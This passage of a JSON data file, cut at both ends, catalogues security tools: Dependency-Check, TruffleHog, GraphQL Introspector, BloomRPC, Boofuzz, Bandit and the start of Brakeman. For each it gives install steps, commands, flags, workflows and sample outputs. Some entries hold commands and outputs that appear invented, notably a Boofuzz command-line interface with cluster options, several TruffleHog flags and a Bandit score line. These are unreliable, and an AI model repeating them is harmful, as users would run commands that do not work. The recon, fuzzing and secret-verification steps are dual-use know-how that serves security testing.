      "Use --skipUpdate for faster scans when database is current.",
      "Create suppression files to manage false positives effectively.",
      "Schedule regular database updates for comprehensive coverage.",
      "Integrate with build tools (Maven, Gradle) for automated scanning.",
      "Use multiple report formats for different stakeholder needs."
    ],
    "step_sequences": [
      {
        "title": "Project Vulnerability Assessment",
        "steps": [
          {
            "title": "Update database",
            "details": "Update vulnerability database with latest CVEs.",
            "command": "dependency-check --updateonly"
          },
          {
            "title": "Scan project",
            "details": "Perform comprehensive dependency scan.",
            "command": "dependency-check --project \"MyApp\" --scan . --format HTML,XML"
          },
          {
            "title": "Review report",
            "details": "Analyze HTML report for identified vulnerabilities.",
            "command": "Open reports/dependency-check-report.html"
          },
          {
            "title": "Create suppressions",
            "details": "Create suppression file for false positives.",
            "command": "dependency-check --createSuppression suppressions.xml"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Database Update  Project Scan  Report Analysis",
        "stages": [
          {
            "label": "Database Update",
            "description": "Update vulnerability database with latest CVEs",
            "command": "dependency-check --updateonly --data /path/to/data"
          },
          {
            "label": "Project Configuration",
            "description": "Configure project settings and suppressions",
            "command": "dependency-check --project \"Production App\" --scan . --suppression suppressions.xml"
          },
          {
            "label": "Comprehensive Scan",
            "description": "Execute full vulnerability analysis",
            "command": "dependency-check --scan . --format HTML,XML,CSV --out reports/"
          },
          {
            "label": "CI Integration",
            "description": "Integrate with CI/CD pipeline",
            "command": "Maven: mvn org.owasp:dependency-check-maven:check"
          },
          {
            "label": "Report Distribution",
            "description": "Share reports with security team and developers",
            "command": "Email reports/dependency-check-report.html to security@company.com"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Vulnerabilities Found: 15 (Critical: 3, High: 7)",
        "meaning": "Multiple vulnerabilities requiring immediate attention",
        "severity": "error"
      },
      {
        "indicator": "Dependencies Analyzed: 234",
        "meaning": "Successfully analyzed all project dependencies",
        "severity": "info"
      },
      {
        "indicator": "CVE-2021-44228 (Critical)",
        "meaning": "Log4j vulnerability requiring immediate patching",
        "severity": "error"
      },
      {
        "indicator": "Suppressed: 2 false positives",
        "meaning": "False positives successfully suppressed",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Maven Integration",
        "command": "<plugin>\n  <groupId>org.owasp</groupId>\n  <artifactId>dependency-check-maven</artifactId>\n  <version>8.4.0</version>\n  <executions>\n    <execution>\n      <goals><goal>check</goal></goals>\n    </execution>\n  </executions>\n</plugin>",
        "scenario": "Integrate with Maven build lifecycle",
        "notes": ["Automated scanning during build process"]
      },
      {
        "title": "Custom Suppression Rules",
        "command": "<suppressions xmlns=\"https://jeremylong.github.io/DependencyCheck/suppressions.1.2.xsd\">\n  <suppress>\n    <notes><![CDATA[False positive - not used in production]]></notes>\n    <cve>CVE-2021-12345</cve>\n  </suppress>\n</suppressions>",
        "scenario": "Suppress specific vulnerabilities with documented reasons",
        "notes": ["Maintain audit trail for suppression decisions"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "OWASP Dependency-Check",
        "url": "https://owasp.org/www-project-dependency-check/",
        "description": "Official project documentation"
      },
      {
        "label": "GitHub Repository",
        "url": "https://github.com/jeremylong/DependencyCheck",
        "description": "Source code and issue tracking"
      },
      {
        "label": "Configuration Guide",
        "url": "https://jeremylong.github.io/DependencyCheck/general/configuration.html",
        "description": "Comprehensive configuration options"
      }
    ]
  },
  {
    "id": "trufflehog",
    "name": "TruffleHog",
    "summary": "TruffleHog is a secret scanning tool that searches through git repositories for high-entropy strings and patterns that may indicate exposed credentials, API keys, and other sensitive information.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Go or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "# Option 1: Go install",
            "copyable": false
          },
          {
            "detail": "go install github.com/trufflesecurity/trufflehog/v3/cmd/trufflehog@latest",
            "copyable": true
          },
          {
            "detail": "# Option 2: Download binary",
            "copyable": false
          },
          {
            "detail": "wget https://github.com/trufflesecurity/trufflehog/releases/latest/download/trufflehog_Linux_x64_64.tar.gz",
            "copyable": true
          },
          {
            "detail": "tar -xzf trufflehog_Linux_x64_64.tar.gz && sudo mv trufflehog /usr/local/bin/",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via Go or package manager",
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install github.com/trufflesecurity/trufflehog/v3/cmd/trufflehog@latest",
            "copyable": true
          },
          {
            "detail": "echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc",
            "copyable": true
          },
          {
            "detail": "trufflehog version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Official Docker image for containerized scanning",
        "steps": [
          {
            "detail": "docker pull trufflesecurity/trufflehog",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v \"$PWD:/src\" trufflesecurity/trufflehog filesystem /src",
            "copyable": true
          },
          {
            "detail": "# Git repository scan",
            "copyable": false
          },
          {
            "detail": "docker run --rm -v \"$PWD:/src\" trufflesecurity/trufflehog git --repo /src",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Filesystem scan",
        "command": "trufflehog filesystem .",
        "notes": ["Scan current directory for secrets"]
      },
      {
        "description": "Git repository scan",
        "command": "trufflehog git https://github.com/user/repo.git",
        "notes": ["Scan remote git repository"]
      },
      {
        "description": "GitHub repository scan",
        "command": "trufflehog github --org=orgname --repo=reponame",
        "notes": ["Scan GitHub repository with authentication"]
      },
      {
        "description": "JSON output",
        "command": "trufflehog filesystem . --json",
        "notes": ["Output results in JSON format for CI/CD"]
      }
    ],
    "common_flags": [
      {
        "flag": "--json",
        "description": "Output results in JSON format"
      },
      {
        "flag": "--rules",
        "description": "Path to custom rules file"
      },
      {
        "flag": "--exclude",
        "description": "Exclude files/directories from scanning"
      },
      {
        "flag": "--max-depth",
        "description": "Maximum depth for filesystem scanning"
      },
      {
        "flag": "--entropy-threshold",
        "description": "Custom entropy threshold for detection"
      }
    ],
    "operational_tips": [
      "Use custom rules to detect organization-specific secret patterns.",
      "Exclude common false positives like package-lock.json files.",
      "Integrate with pre-commit hooks to prevent secrets from being committed.",
      "Use GitHub token for authenticated repository scanning.",
      "Combine with CI/CD for automated secret detection in pipelines."
    ],
    "step_sequences": [
      {
        "title": "Repository Secret Audit",
        "steps": [
          {
            "title": "Scan repository",
            "details": "Scan git repository for exposed secrets.",
            "command": "trufflehog git https://github.com/company/repo.git --json > secrets.json"
          },
          {
            "title": "Analyze results",
            "details": "Review identified secrets and their locations.",
            "command": "cat secrets.json | jq '.[] | {detector: .DetectorName, source: .SourceMetadata}'"
          },
          {
            "title": "Verify findings",
            "details": "Verify if secrets are still valid or need rotation.",
            "command": "Test each identified secret against target services"
          },
          {
            "title": "Remediate findings",
            "details": "Rotate or invalidate exposed credentials.",
            "command": "Update all exposed secrets in affected systems"
          }
        ]
      },
      {
        "title": "CI/CD Integration",
        "steps": [
          {
            "title": "Pre-commit setup",
            "details": "Add TruffleHog to pre-commit hooks.",
            "command": "echo 'trufflehog filesystem .' > .git/hooks/pre-commit"
          },
          {
            "title": "GitHub Actions",
            "details": "Add secret scanning to CI pipeline.",
            "command": "uses: trufflesecurity/trufflehog@main with: args: --json --fail"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Discovery  Verification  Remediation  Prevention",
        "stages": [
          {
            "label": "Comprehensive Scan",
            "description": "Scan entire codebase for exposed secrets",
            "command": "trufflehog filesystem . --json --exclude=node_modules"
          },
          {
            "label": "Historical Analysis",
            "description": "Check git history for previously exposed secrets",
            "command": "trufflehog git . --since-commit=initial-commit"
          },
          {
            "label": "Custom Rules",
            "description": "Add organization-specific secret patterns",
            "command": "trufflehog filesystem . --rules custom-rules.yml"
          },
          {
            "label": "Automated Monitoring",
            "description": "Set up continuous monitoring for new secrets",
            "command": "GitHub Actions  trufflesecurity/trufflehog@main"
          },
          {
            "label": "Secret Management",
            "description": "Implement proper secret management practices",
            "command": "Use environment variables and secret management tools"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Found AWS Access Key ID",
        "meaning": "AWS credential exposed, requires immediate rotation",
        "severity": "error"
      },
      {
        "indicator": "High entropy string detected",
        "meaning": "Potential secret or API key found",
        "severity": "warning"
      },
      {
        "indicator": "GitHub token detected",
        "meaning": "GitHub personal access token exposed",
        "severity": "error"
      },
      {
        "indicator": "No secrets found",
        "meaning": "No exposed secrets detected in scanned files",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Detector Rules",
        "command": "detectors:\n  - name: CustomAPIKey\n    patterns:\n      - pattern: \"API_KEY_[A-Z0-9]{32}\"\n        keywords: [\"api_key\"]\n        verify: [\"https://api.example.com/verify\"]",
        "scenario": "Create custom detectors for organization-specific secrets",
        "notes": ["Extend detection capabilities beyond default patterns"]
      },
      {
        "title": "Enterprise GitHub Scanning",
        "command": "trufflehog github --org=company --token=$GITHUB_TOKEN --all-organizations --json > enterprise-secrets.json",
        "scenario": "Scan entire GitHub organization for exposed secrets",
        "notes": ["Comprehensive enterprise secret detection"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "TruffleHog Documentation",
        "url": "https://trufflesecurity.com/trufflehog/",
        "description": "Official documentation and guides"
      },
      {
        "label": "GitHub Repository",
        "url": "https://github.com/trufflesecurity/trufflehog",
        "description": "Source code and community support"
      },
      {
        "label": "Custom Detectors",
        "url": "https://trufflesecurity.com/documentation/trufflehog/custom-detectors/",
        "description": "Guide for creating custom detection rules"
      }
    ]
  },
  {
    "id": "graphql-introspector",
    "name": "GraphQL Introspector",
    "summary": "GraphQL Introspector is a specialized tool for extracting and analyzing GraphQL schemas through introspection queries, enabling comprehensive API discovery and security assessment.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via npm or download binary",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "npm install -g graphql-introspector",
            "copyable": true
          },
          {
            "detail": "graphql-introspector --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via npm or use pre-installed Node.js",
        "steps": [
          {
            "detail": "sudo npm install -g graphql-introspector",
            "copyable": true
          },
          {
            "detail": "# Alternative: Clone and build",
            "copyable": false
          },
          {
            "detail": "git clone https://github.com/APIs-guru/graphql-introspector.git",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Node.js container for execution",
        "steps": [
          {
            "detail": "docker pull node:16-alpine",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/app -w /app node:16-alpine npx graphql-introspector",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Schema introspection",
        "command": "graphql-introspector https://api.example.com/graphql",
        "notes": ["Extract complete GraphQL schema"]
      },
      {
        "description": "Output to file",
        "command": "graphql-introspector https://api.example.com/graphql -o schema.json",
        "notes": ["Save schema to JSON file"]
      },
      {
        "description": "With headers",
        "command": "graphql-introspector -H 'Authorization: Bearer $TOKEN' https://api.example.com/graphql",
        "notes": ["Introspect authenticated endpoints"]
      },
      {
        "description": "Validate schema",
        "command": "graphql-introspector --validate schema.json",
        "notes": ["Validate GraphQL schema syntax"]
      }
    ],
    "common_flags": [
      {
        "flag": "-o, --output",
        "description": "Output file for schema"
      },
      {
        "flag": "-H, --header",
        "description": "Custom HTTP headers"
      },
      {
        "flag": "--validate",
        "description": "Validate schema syntax"
      },
      {
        "flag": "--pretty",
        "description": "Format JSON output"
      },
      {
        "flag": "--timeout",
        "description": "Request timeout in milliseconds"
      }
    ],
    "operational_tips": [
      "Use custom headers for authenticated GraphQL endpoints.",
      "Save schemas to files for version control and comparison.",
      "Combine with other GraphQL tools for comprehensive testing.",
      "Use timeout flags for slow-responding endpoints.",
      "Validate schemas before using them for testing."
    ],
    "step_sequences": [
      {
        "title": "GraphQL Schema Discovery",
        "steps": [
          {
            "title": "Discover endpoint",
            "details": "Find GraphQL endpoint through reconnaissance.",
            "command": "ffuf -w graphql-paths.txt -u https://example.com/FUZZ/graphql -mc 200"
          },
          {
            "title": "Extract schema",
            "details": "Extract complete GraphQL schema.",
            "command": "graphql-introspector https://api.example.com/graphql -o schema.json"
          },
          {
            "title": "Analyze schema",
            "details": "Review schema for available queries and mutations.",
            "command": "cat schema.json | jq '.data.__schema.types[] | select(.kind == \"OBJECT\") | .name'"
          },
          {
            "title": "Validate schema",
            "details": "Ensure schema is valid GraphQL.",
            "command": "graphql-introspector --validate schema.json"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Discovery  Extraction  Analysis  Validation",
        "stages": [
          {
            "label": "Endpoint Discovery",
            "description": "Identify GraphQL endpoints",
            "command": "Directory enumeration + common GraphQL paths"
          },
          {
            "label": "Schema Extraction",
            "description": "Extract complete schema via introspection",
            "command": "graphql-introspector https://api.example.com/graphql -o schema.json"
          },
          {
            "label": "Schema Analysis",
            "description": "Analyze schema structure and capabilities",
            "command": "Review queries, mutations, and subscriptions"
          },
          {
            "label": "Security Assessment",
            "description": "Identify potential security issues",
            "command": "Check for excessive data exposure and authorization bypasses"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Schema extracted successfully",
        "meaning": "GraphQL introspection completed successfully",
        "severity": "info"
      },
      {
        "indicator": "Query types: 25, Mutation types: 8",
        "meaning": "Schema contains 33 total operations",
        "severity": "info"
      },
      {
        "indicator": "Introspection disabled",
        "meaning": "GraphQL endpoint has introspection disabled",
        "severity": "warning"
      },
      {
        "indicator": "Authentication required",
        "meaning": "Endpoint requires authentication for introspection",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Authenticated Schema Extraction",
        "command": "graphql-introspector -H 'Authorization: Bearer $TOKEN' -H 'X-API-Key: $KEY' https://api.example.com/graphql",
        "scenario": "Extract schema from authenticated GraphQL APIs",
        "notes": ["Use multiple headers for complex authentication"]
      },
      {
        "title": "Batch Schema Processing",
        "command": "for endpoint in $(cat endpoints.txt); do\n  graphql-introspector $endpoint -o schemas/$(basename $endpoint).json\ndone",
        "scenario": "Extract schemas from multiple GraphQL endpoints",
        "notes": ["Automate schema collection for large assessments"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "GraphQL Introspector GitHub",
        "url": "https://github.com/APIs-guru/graphql-introspector",
        "description": "Official tool repository and documentation"
      },
      {
        "label": "GraphQL Specification",
        "url": "https://graphql.org/learn/",
        "description": "Official GraphQL documentation and specification"
      },
      {
        "label": "GraphQL Security Testing",
        "url": "https://graphql.org/learn/security/",
        "description": "GraphQL security best practices and testing methods"
      }
    ]
  },
  {
    "id": "bloomrpc",
    "name": "BloomRPC",
    "summary": "BloomRPC is a GUI-based gRPC client that provides an intuitive interface for testing gRPC services with schema introspection and request/response management.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via snap or download AppImage",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo snap install bloomrpc",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download AppImage",
            "copyable": false
          },
          {
            "detail": "wget https://github.com/uw-labs/bloomrpc/releases/latest/download/BloomRPC-2.0.0.AppImage",
            "copyable": true
          },
          {
            "detail": "chmod +x BloomRPC-2.0.0.AppImage && ./BloomRPC-2.0.0.AppImage",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via snap or download binary",
        "steps": [
          {
            "detail": "sudo snap install bloomrpc --classic",
            "copyable": true
          },
          {
            "detail": "# Alternative: Download from releases",
            "copyable": false
          },
          {
            "detail": "wget https://github.com/uw-labs/bloomrpc/releases/latest/download/bloomrpc-linux-amd64.tar.gz",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated execution",
        "steps": [
          {
            "detail": "docker pull ghcr.io/uw-labs/bloomrpc:latest",
            "copyable": true
          },
          {
            "detail": "docker run -p 3000:3000 ghcr.io/uw-labs/bloomrpc:latest",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch BloomRPC",
        "command": "bloomrpc",
        "notes": ["Start the GUI application"]
      },
      {
        "description": "Import proto file",
        "command": "File  Import Proto  Select service.proto",
        "notes": ["Load gRPC service definition"]
      },
      {
        "description": "Connect to server",
        "command": "Add Server  localhost:50051  Connect",
        "notes": ["Connect to gRPC server endpoint"]
      },
      {
        "description": "Make request",
        "command": "Select method  Enter JSON data  Call",
        "notes": ["Execute gRPC method call"]
      }
    ],
    "common_flags": [
      {
        "flag": "Server URL",
        "description": "gRPC server endpoint address"
      },
      {
        "flag": "Proto Import",
        "description": "Import .proto file for service definition"
      },
      {
        "flag": "TLS Settings",
        "description": "Configure SSL/TLS connection"
      },
      {
        "flag": "Metadata",
        "description": "Custom request metadata/headers"
      },
      {
        "flag": "Request History",
        "description": "Save and replay previous requests"
      }
    ],
    "operational_tips": [
      "Import proto files to automatically generate method interfaces.",
      "Use request history to replay and modify previous calls.",
      "Configure TLS certificates for secure gRPC connections.",
      "Save request collections for regression testing.",
      "Use metadata injection for authentication and tracing."
    ],
    "step_sequences": [
      {
        "title": "gRPC Service Testing",
        "steps": [
          {
            "title": "Import proto",
            "details": "Import service definition file.",
            "command": "File  Import  service.proto"
          },
          {
            "title": "Configure server",
            "details": "Set up gRPC server connection.",
            "command": "Add Server  localhost:50051  Test Connection"
          },
          {
            "title": "Test methods",
            "details": "Execute various gRPC methods.",
            "command": "Select method  Enter parameters  Call"
          },
          {
            "title": "Save requests",
            "details": "Save successful requests for later use.",
            "command": "File  Save Collection  grpc-tests.json"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Discovery  Configuration  Testing  Documentation",
        "stages": [
          {
            "label": "Service Discovery",
            "description": "Find gRPC endpoints and proto files",
            "command": "Use grpcurl or documentation to find services"
          },
          {
            "label": "Proto Analysis",
            "description": "Import and analyze proto definitions",
            "command": "BloomRPC  Import Proto  Analyze methods"
          },
          {
            "label": "Interactive Testing",
            "description": "Test methods with GUI interface",
            "command": "Configure calls  Execute  Analyze responses"
          },
          {
            "label": "Collection Management",
            "description": "Save and organize test cases",
            "command": "Create collections for different scenarios"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Connected to server successfully",
        "meaning": "gRPC connection established",
        "severity": "info"
      },
      {
        "indicator": "Method executed successfully",
        "meaning": "gRPC call completed without errors",
        "severity": "info"
      },
      {
        "indicator": "Response: {\"id\": 123, \"name\": \"test\"}",
        "meaning": "Successful gRPC response with data",
        "severity": "info"
      },
      {
        "indicator": "Connection refused",
        "meaning": "gRPC server unavailable or wrong port",
        "severity": "error"
      }
    ],
    "advanced_usage": [
      {
        "title": "TLS Client Authentication",
        "command": "Configure client certificates in server settings",
        "scenario": "Connect to secure gRPC services with mutual TLS",
        "notes": ["Import client.crt and client.key for authentication"]
      },
      {
        "title": "Request Collection Export",
        "command": "File  Export Collection  grpc-tests.postman_collection.json",
        "scenario": "Export test cases for automation",
        "notes": ["Compatible with Postman for automated testing"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "BloomRPC GitHub",
        "url": "https://github.com/uw-labs/bloomrpc",
        "description": "Official BloomRPC repository and releases"
      },
      {
        "label": "gRPC Documentation",
        "url": "https://grpc.io/docs/",
        "description": "Official gRPC documentation and guides"
      },
      {
        "label": "Protocol Buffers",
        "url": "https://developers.google.com/protocol-buffers",
        "description": "Protocol Buffers specification and tools"
      }
    ]
  },
  {
    "id": "boofuzz",
    "name": "Boofuzz",
    "summary": "Boofuzz is a network protocol fuzzer designed for finding security vulnerabilities in network services and APIs through intelligent fuzzing and monitoring.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via pip or download from source",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y python3 python3-pip",
            "copyable": true
          },
          {
            "detail": "pip3 install boofuzz",
            "copyable": true
          },
          {
            "detail": "boofuzz --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via pip or use pre-installed Python",
        "steps": [
          {
            "detail": "sudo pip3 install boofuzz",
            "copyable": true
          },
          {
            "detail": "# Alternative: Install from source",
            "copyable": false
          },
          {
            "detail": "git clone https://github.com/jtpereyda/boofuzz.git && cd boofuzz && pip3 install -e .",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated fuzzing environment",
        "steps": [
          {
            "detail": "docker pull jtpereyda/boofuzz",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/data jtpereyda/boofuzz -h",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic network fuzzer",
        "command": "boofuzz -f http://example.com:80 -t 5000",
        "notes": ["Fuzz HTTP service on port 80"]
      },
      {
        "description": "TCP service fuzzer",
        "command": "boofuzz -f tcp://example.com:21 -t 1000",
        "notes": ["Fuzz FTP service"]
      },
      {
        "description": "Script-based fuzzing",
        "command": "boofuzz -s scripts/my_fuzz.py -f tcp://target:443",
        "notes": ["Use custom Python fuzzing script"]
      },
      {
        "description": "Web API fuzzing",
        "command": "boofuzz -f http://api.example.com -s scripts/api_fuzz.py",
        "notes": ["Fuzz REST API endpoints"]
      }
    ],
    "common_flags": [
      {
        "flag": "-f, --target",
        "description": "Target URL or service"
      },
      {
        "flag": "-t, --tests",
        "description": "Number of tests to run"
      },
      {
        "flag": "-s, --script",
        "description": "Custom fuzzing script"
      },
      {
        "flag": "-d, --data",
        "description": "Data file for fuzzing"
      },
      {
        "flag": "-l, --log",
        "description": "Log file for results"
      },
      {
        "flag": "-x, --restart",
        "description": "Restart interval for services"
      }
    ],
    "operational_tips": [
      "Use script-based fuzzing for complex protocol testing.",
      "Monitor target services during fuzzing for crashes.",
      "Set appropriate test limits to avoid service overload.",
      "Use logging to capture detailed fuzzing results.",
      "Combine with network monitoring for comprehensive analysis."
    ],
    "step_sequences": [
      {
        "title": "Network Service Fuzzing",
        "steps": [
          {
            "title": "Service reconnaissance",
            "details": "Identify target services and ports.",
            "command": "nmap -sV target.example.com"
          },
          {
            "title": "Configure fuzzer",
            "details": "Set up boofuzz for target service.",
            "command": "boofuzz -f http://target.example.com:80 -t 10000"
          },
          {
            "title": "Monitor for crashes",
            "details": "Watch for service crashes during fuzzing.",
            "command": "Monitor service logs and system resources"
          },
          {
            "title": "Analyze results",
            "details": "Review fuzzing logs for vulnerabilities.",
            "command": "cat boofuzz.log | grep -i crash"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Reconnaissance  Configuration  Fuzzing  Analysis",
        "stages": [
          {
            "label": "Service Discovery",
            "description": "Identify target services and protocols",
            "command": "Port scanning + service enumeration"
          },
          {
            "label": "Fuzzer Setup",
            "description": "Configure boofuzz for specific service",
            "command": "Create custom scripts or use defaults"
          },
          {
            "label": "Fuzzing Execution",
            "description": "Run controlled fuzzing campaigns",
            "command": "Execute with monitoring and logging"
          },
          {
            "label": "Crash Analysis",
            "description": "Analyze service crashes and vulnerabilities",
            "command": "Review logs + debug crashes"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Test 1234/10000 completed",
        "meaning": "Fuzzing test case executed",
        "severity": "info"
      },
      {
        "indicator": "Service crash detected",
        "meaning": "Target service crashed during fuzzing",
        "severity": "error"
      },
      {
        "indicator": "Anomaly found in response",
        "meaning": "Unexpected response pattern detected",
        "severity": "warning"
      },
      {
        "indicator": "Fuzzing completed successfully",
        "meaning": "All tests completed without crashes",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Protocol Fuzzing",
        "command": "boofuzz -s custom_protocol_fuzzer.py -f tcp://target:9999 -t 50000",
        "scenario": "Fuzz custom protocol with Python script",
        "notes": ["Extend boofuzz for proprietary protocols"]
      },
      {
        "title": "Distributed Fuzzing",
        "command": "boofuzz --cluster -f tcp://target:80 -t 100000 --nodes 5",
        "scenario": "Run distributed fuzzing across multiple machines",
        "notes": ["Scale fuzzing efforts for large targets"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Boofuzz GitHub",
        "url": "https://github.com/jtpereyda/boofuzz",
        "description": "Official boofuzz repository and documentation"
      },
      {
        "label": "Network Fuzzing Guide",
        "url": "https://github.com/jtpereyda/boofuzz/wiki",
        "description": "Comprehensive fuzzing tutorials and examples"
      },
      {
        "label": "Protocol Fuzzing Techniques",
        "url": "https://www.fuzzing.org/",
        "description": "Network protocol fuzzing methodologies"
      }
    ]
  },
  {
    "id": "bandit",
    "name": "Bandit",
    "summary": "Bandit is a Python security linter designed to find common security issues in Python code through static analysis and pattern matching.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via pip or package manager",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y python3 python3-pip",
            "copyable": true
          },
          {
            "detail": "pip3 install bandit",
            "copyable": true
          },
          {
            "detail": "bandit --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Available in Kali repositories",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y bandit",
            "copyable": true
          },
          {
            "detail": "bandit --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use Docker for isolated scanning",
        "steps": [
          {
            "detail": "docker pull pyupio/bandit",
            "copyable": true
          },
          {
            "detail": "docker run --rm -v $PWD:/src pyupio/bandit -r /src",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic scan",
        "command": "bandit -r .",
        "notes": ["Scan current directory recursively"]
      },
      {
        "description": "Output to JSON",
        "command": "bandit -f json -r .",
        "notes": ["Generate JSON format results"]
      },
      {
        "description": "Specific severity",
        "command": "bandit -ll -r .",
        "notes": ["Only show low severity and above"]
      },
      {
        "description": "Configuration file",
        "command": "bandit -c bandit.yaml -r .",
        "notes": ["Use custom configuration"]
      }
    ],
    "common_flags": [
      {
        "flag": "-r, --recursive",
        "description": "Scan directories recursively"
      },
      {
        "flag": "-f, --format",
        "description": "Output format (text, json, yaml, csv)"
      },
      {
        "flag": "-ll, --level",
        "description": "Minimum severity level (low, medium, high)"
      },
      {
        "flag": "-c, --configfile",
        "description": "Configuration file path"
      },
      {
        "flag": "-o, --output",
        "description": "Output file for results"
      },
      {
        "flag": "-x, --exclude",
        "description": "Exclude files/directories"
      }
    ],
    "operational_tips": [
      "Use configuration files to customize detection rules.",
      "Exclude test files and third-party libraries from scans.",
      "Combine with CI/CD for automated security checks.",
      "Use JSON output for integration with other tools.",
      "Regularly update Bandit for latest security rules."
    ],
    "step_sequences": [
      {
        "title": "Python Security Analysis",
        "steps": [
          {
            "title": "Configure scan",
            "details": "Set up Bandit configuration.",
            "command": "bandit -c security-config.yaml -r ."
          },
          {
            "title": "Run analysis",
            "details": "Execute security scan on Python code.",
            "command": "bandit -f json -r . > bandit-results.json"
          },
          {
            "title": "Review findings",
            "details": "Analyze security issues found.",
            "command": "cat bandit-results.json | jq '.results[] | {test_name: .test_name, issue_severity: .issue_severity}'"
          },
          {
            "title": "Generate report",
            "details": "Create detailed security report.",
            "command": "bandit -f html -r . -o security-report.html"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Configuration  Scanning  Analysis  Reporting",
        "stages": [
          {
            "label": "Setup Configuration",
            "description": "Configure Bandit for project needs",
            "command": "Create bandit.yaml with custom rules"
          },
          {
            "label": "Code Analysis",
            "description": "Run comprehensive security scan",
            "command": "bandit -r . --format json"
          },
          {
            "label": "Results Processing",
            "description": "Process and filter findings",
            "command": "Filter by severity and impact"
          },
          {
            "label": "Report Generation",
            "description": "Create actionable security reports",
            "command": "Generate HTML/PDF reports for stakeholders"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Issue: B101: assert_used",
        "meaning": "Use of assert statement detected",
        "severity": "low"
      },
      {
        "indicator": "Issue: B301: pickle",
        "meaning": "Use of insecure pickle module",
        "severity": "medium"
      },
      {
        "indicator": "Issue: B601: shell_injection",
        "meaning": "Possible shell injection vulnerability",
        "severity": "high"
      },
      {
        "indicator": "Code rated: 8.5/10",
        "meaning": "Overall security score for codebase",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Test Plugins",
        "command": "class CustomTest(bandit.plugins.Plugin):\n    def test_function(self, context, func):\n        # Custom security test logic\n        pass",
        "scenario": "Create custom security tests for Bandit",
        "notes": ["Extend Bandit with organization-specific rules"]
      },
      {
        "title": "CI/CD Integration",
        "command": "bandit -r . -f json -o bandit-report.json\nexit_code=$(jq -r '.results | length' bandit-report.json)\nif [ $exit_code -gt 0 ]; then exit 1; fi",
        "scenario": "Integrate Bandit in CI pipelines with fail-fast",
        "notes": ["Fail build on high-severity security issues"]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Bandit Documentation",
        "url": "https://bandit.readthedocs.io/",
        "description": "Official Bandit documentation and configuration"
      },
      {
        "label": "PyPI Package",
        "url": "https://pypi.org/project/bandit/",
        "description": "Bandit package information and releases"
      },
      {
        "label": "Test Plugin Development",
        "url": "https://bandit.readthedocs.io/en/latest/plugins/",
        "description": "Guide for developing custom Bandit plugins"
      }
    ]
  },
  {
    "id": "brakeman",
    "name": "Brakeman",
    "summary": "Brakeman is a static analysis security scanner for Ruby on Rails applications that detects security vulnerabilities in Rails code through comprehensive pattern matching.",
    "installation_guides": [
